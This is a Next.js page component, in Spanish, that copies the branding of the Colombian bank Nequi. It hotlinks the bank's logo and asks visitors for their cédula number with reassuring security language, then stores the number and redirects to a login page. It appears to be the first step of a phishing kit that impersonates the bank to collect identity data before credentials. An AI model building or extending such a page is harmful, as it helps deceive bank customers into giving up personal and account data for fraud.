'use client'

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useState } from "react"

export default function CedulaPage() {
  const router = useRouter()
  const [cedula, setCedula] = useState('')

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (cedula.length >= 8) {
      sessionStorage.setItem('cedula', cedula)
      router.push('/login')
    }
  }

  return (
    <main className="min-h-screen bg-pink-50 relative">
      {/* Background Image */}
      <div className="absolute inset-0 z-0">
        <Image
          src="img/background.png"
          alt="Diseño Nequi"
          layout="fill"
          objectFit="cover"
          quality={100}
          priority
        />
      </div>

      {/* Navbar */}
      <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <Button 
            variant="ghost" 
            onClick={() => window.location.reload()}
            className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
          >
            Recargar
          </Button>
        </div>
      </nav>

      {/* Content */}
      <div className="relative z-10 max-w-md mx-auto space-y-4 p-4 pt-8">
        <Card className="bg-white/90 backdrop-blur-sm">
          <CardHeader className="space-y-2">
            <CardTitle className="text-center text-[#200020] text-2xl">Identifícate</CardTitle>
            <p className="text-center text-gray-600">
              Para acceder a tu cuenta Nequi, necesitamos verificar tu identidad
            </p>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="cedula" className="text-gray-700">Número de cédula</Label>
                  <Input
                    id="cedula"
                    type="number"
                    required
                    value={cedula}
                    onChange={(e) => setCedula(e.target.value)}
                    placeholder="Ingresa tu número de cédula"
                    className="w-full"
                  />
                  <p className="text-sm text-gray-500">
                    Tu cédula es el documento que te identifica como ciudadano
                  </p>
                </div>

                <div className="bg-blue-50 p-4 rounded-lg space-y-2">
                  <h3 className="font-medium text-blue-800">¿Por qué necesitamos tu cédula?</h3>
                  <ul className="text-sm text-blue-700 space-y-1 list-disc pl-4">
                    <li>Para proteger tu cuenta y tus datos personales</li>
                    <li>Para verificar tu identidad de forma segura</li>
                    <li>Para cumplir con los requisitos de seguridad bancaria</li>
                  </ul>
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white h-12 text-lg font-medium"
                disabled={cedula.length < 8}
              >
                Continuar
              </Button>

              <p className="text-xs text-center text-gray-500 mt-4">
                Tus datos están protegidos y son manejados de forma segura según nuestra política de privacidad
              </p>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
